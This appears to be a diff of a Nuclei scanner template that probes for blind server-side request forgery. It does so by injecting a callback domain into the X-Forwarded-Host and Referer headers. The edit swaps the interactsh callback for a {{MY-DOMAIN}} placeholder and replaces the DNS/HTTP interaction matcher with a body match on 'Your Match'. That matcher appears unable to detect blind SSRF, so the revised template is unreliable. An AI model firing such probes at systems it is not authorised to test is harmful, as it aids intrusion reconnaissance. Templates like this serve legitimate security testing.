@@ -2,17 +2,16 @@ id: 0x013
 
 info:
   name: Blind SSRF
-  author: reewardius
-  severity: high
-  tags: ssrf
+  author: 0xAwali
+  severity: info
 
-http:
+requests:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        X-Forwarded-Host: {{Host}}.{{Port}}.BSSRF-013.{{interactsh-url}}
-        Referer: {{Scheme}}://{{Host}}.{{Port}}.BSSRF-013.{{interactsh-url}}
+        X-Forwarded-Host: {{Host}}.{{Port}}.BSSRF-013.{{MY-DOMAIN}}
+        Referer: {{Scheme}}://{{Host}}.{{Port}}.BSSRF-013.{{MY-DOMAIN}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cache-Control: no-transform
         Accept-Encoding: gzip, deflate
@@ -20,8 +19,6 @@ http:
 
     matchers:
       - type: word
-        part: interactsh_protocol
+        part: body
         words:
-          - "dns"
-          - "http"
-        condition: or
+          - "Your Match"
